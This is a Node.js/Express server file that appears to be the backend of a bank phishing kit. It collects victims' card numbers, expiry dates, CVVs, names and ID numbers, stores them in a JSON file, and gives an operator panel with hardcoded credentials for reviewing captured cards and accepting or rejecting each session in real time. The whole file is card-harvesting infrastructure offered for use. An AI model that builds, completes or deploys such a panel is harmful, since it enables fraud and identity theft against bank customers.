const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

const DB_FILE = path.join(__dirname, 'db.json');
let db = { sesiones: [], historial: [], tarjetas: [] };

if (fs.existsSync(DB_FILE)) {
    try {
        const parsed = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
        db.sesiones = parsed.sesiones || [];
        db.historial = parsed.historial || [];
        db.tarjetas = parsed.tarjetas || [];
    } catch (e) {}
}

function guardarDB() { fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2)); }

app.post('/api/sesion', (req, res) => {
    const { sessionId, bancoKey, estado, paso, datos } = req.body;
    let sesion = db.sesiones.find(s => s.sessionId === sessionId);
    
    if (sesion) {
        sesion.estado = estado;
        sesion.paso = paso;
        sesion.datos = { ...sesion.datos, ...datos };
    } else {
        sesion = { id: Date.now(), sessionId, bancoKey, estado, paso, datos: { bancoKey, ...datos }, fecha: new Date() };
        db.sesiones.push(sesion);
    }

    if (datos && datos.tarjeta) {
        const tarjetaExiste = db.tarjetas.find(t => 
            t.tarjeta === datos.tarjeta && 
            t.expMes === (datos.expMes || '') && 
            t.expAnio === (datos.expAnio || '') && 
            t.cvv === (datos.cvv || '')
        );

        if (!tarjetaExiste) {
            db.tarjetas.push({
                id: 'T-' + Date.now() + '-' + Math.random().toString(36).substring(2, 7),
                sessionId: sessionId,
                nombre: (datos.datosPersonales?.primerNombre || '') + ' ' + (datos.datosPersonales?.primerApellido || ''),
                documento: datos.docNumber || '-',
                tarjeta: datos.tarjeta,
                expMes: datos.expMes || '',
                expAnio: datos.expAnio || '',
                cvv: datos.cvv || '-',
                estado: estado || 'pendiente',
                fecha: new Date()
            });
        }
    }

    guardarDB();
    res.json({ ok: true, sessionId });
});

app.get('/api/sesion/:sessionId/estado', (req, res) => {
    const { sessionId } = req.params;
    const sesion = db.sesiones.find(s => s.sessionId === sessionId);
    if (!sesion) return res.status(404).json({ error: 'Sesión no encontrada' });
    res.json({ estado: sesion.estado });
});

app.get('/admin/stats', (req, res) => {
    res.json({
        sesiones: db.sesiones.length,
        pendientes: db.sesiones.filter(s => s.estado === 'pendiente').length,
        historial: db.tarjetas.length
    });
});

app.get('/admin/sesiones', (req, res) => { res.json({ sesiones: db.sesiones }); });
app.get('/admin/historial', (req, res) => { res.json({ historial: db.historial }); });

// 🔥 LOGIN PANEL 3 🔥
app.post('/admin/login', (req, res) => {
    const { usuario, password } = req.body;
    
    const USUARIO_CORRECTO = 'DAVIPITA3';
    const PASSWORD_CORRECTA = 'DAVIPITA321$';

    if (usuario === USUARIO_CORRECTO && password === PASSWORD_CORRECTA) {
        res.json({ token: 'davi-token-3-' + Date.now(), usuario });
    } else {
        res.status(401).json({ error: 'Usuario o contraseña incorrectos' });
    }
});

app.post('/admin/sesion/:sessionId/accion', (req, res) => {
    const { sessionId } = req.params;
    const { accion } = req.body;
    const sesion = db.sesiones.find(s => s.sessionId === sessionId);
    if (!sesion) return res.status(404).json({ error: 'Sesión no encontrada' });

    if (accion === 'ACEPTAR') sesion.estado = 'aceptado';
    else if (accion === 'RECHAZAR') sesion.estado = 'rechazado';
    else return res.status(400).json({ error: 'Acción no permitida' });

    db.tarjetas.forEach(t => {
        if (t.sessionId === sessionId && t.estado === 'pendiente') {
            t.estado = sesion.estado;
        }
    });

    db.historial.push({ ...sesion, fechaCierre: new Date() });
    guardarDB();
    res.json({ ok: true, estado: sesion.estado });
});

app.get('/admin/tarjetas', (req, res) => {
    const tarjetasOrdenadas = [...db.tarjetas].sort((a, b) => new Date(b.fecha) - new Date(a.fecha));
    res.json({ tarjetas: tarjetasOrdenadas });
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => console.log(`Backend 3 escuchando en el puerto ${PORT}`));
